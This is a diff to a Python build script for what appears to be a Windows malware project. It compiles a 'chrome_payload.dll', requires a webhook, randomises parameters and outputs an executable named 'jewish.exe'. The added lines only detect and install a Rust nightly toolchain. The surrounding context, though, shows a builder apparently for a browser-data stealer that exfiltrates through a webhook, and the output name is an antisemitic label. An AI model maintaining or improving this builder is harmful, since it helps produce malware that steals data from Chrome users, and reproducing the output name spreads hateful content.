@@ -38,6 +38,21 @@ RELEASE_DIR = os.path.join(PROJECT_ROOT, "release")
 
 # On Linux, cross-compile for Windows; on Windows build natively
 import platform as _platform
+
+def _detect_nightly_toolchain():
+    """Return the nightly toolchain name that rustup knows about, or 'nightly'."""
+    try:
+        out = subprocess.check_output(["rustup", "toolchain", "list"], text=True, stderr=subprocess.DEVNULL)
+        for line in out.splitlines():
+            tok = line.split()[0] if line.split() else ""
+            if tok.startswith("nightly"):
+                return tok
+    except Exception:
+        pass
+    return "nightly"
+
+_NIGHTLY = _detect_nightly_toolchain()
+
 if _platform.system() == "Windows":
     _CARGO_EXTRA = ["-Z", "build-std=std,panic_abort"]
     _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "release")
@@ -47,6 +62,52 @@ else:
 
 TARGET_EXE = os.path.join(_TARGET_REL, "jewish.exe")
 TARGET_DLL = os.path.join(_TARGET_REL, "chrome_payload.dll")
+
+
+# ===== TOOLCHAIN SETUP =====
+
+def ensure_nightly_toolchain():
+    """Install nightly toolchain + rust-src if missing, then return its name."""
+    global _NIGHTLY
+
+    # On Windows we must use the GNU nightly (not MSVC) because the project
+    # cross-targets x86_64-pc-windows-gnu and uses the MinGW linker.
+    if _platform.system() == "Windows":
+        preferred = "nightly-x86_64-pc-windows-gnu"
+    else:
+        preferred = "nightly"
+
+    # Try the detected toolchain first
+    for candidate in [_NIGHTLY, preferred]:
+        try:
+            result = subprocess.run(
+                ["rustup", "run", candidate, "rustc", "--version"],
+                capture_output=True, text=True
+            )
+            if result.returncode == 0:
+                _NIGHTLY = candidate
+                # Ensure rust-src component is present (needed for -Z build-std)
+                subprocess.run(
+                    ["rustup", "component", "add", "rust-src", "--toolchain", candidate],
+                    capture_output=True
+                )
+                return _NIGHTLY
+        except Exception:
+            pass
+
+    print(f"[*] Installing nightly toolchain ({preferred})...")
+    subprocess.run(
+        ["rustup", "toolchain", "install", preferred, "--component", "rust-src"],
+        check=True
+    )
+    _NIGHTLY = preferred
+    # On Windows, also add the GNU target to the nightly toolchain
+    if _platform.system() == "Windows":
+        subprocess.run(
+            ["rustup", "target", "add", "x86_64-pc-windows-gnu", "--toolchain", _NIGHTLY],
+            capture_output=True
+        )
+    return _NIGHTLY
 
 
 # ===== UTILITY FUNCTIONS =====
@@ -113,6 +174,11 @@ def main():
         if not webhook:
             print("[!] No webhook provided.")
             sys.exit(1)
+
+    # Ensure nightly toolchain is available before building
+    print("\n[*] Checking nightly toolchain...")
+    ensure_nightly_toolchain()
+    print(f"[+] Using toolchain: {_NIGHTLY}")
 
     # Generate random parameters
     prefix = generate_random_prefix()
@@ -189,7 +255,7 @@ def main():
 
     # Step 3: Build payload DLL (64-bit)
     print("\n===== 2/7 Building Payload DLLs =====")
-    if not run_command(["cargo", "+nightly", "build", "--release", "-p", "chrome-payload"] + _CARGO_EXTRA, "Building chrome_payload.dll (64-bit)"):
+    if not run_command(["cargo", f"+{_NIGHTLY}", "build", "--release", "-p", "chrome-payload"] + _CARGO_EXTRA, "Building chrome_payload.dll (64-bit)"):
         print("[!] Payload build failed - aborting")
         sys.exit(1)
     if not os.path.exists(TARGET_DLL):
@@ -203,7 +269,7 @@ def main():
     env = {**os.environ}
     try:
         process = subprocess.Popen(
-            ["cargo", "+nightly", "build", "--release", "-p", "jewish"] + _CARGO_EXTRA,
+            ["cargo", f"+{_NIGHTLY}", "build", "--release", "-p", "jewish"] + _CARGO_EXTRA,
             cwd=PROJECT_ROOT, env=env,
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
         )
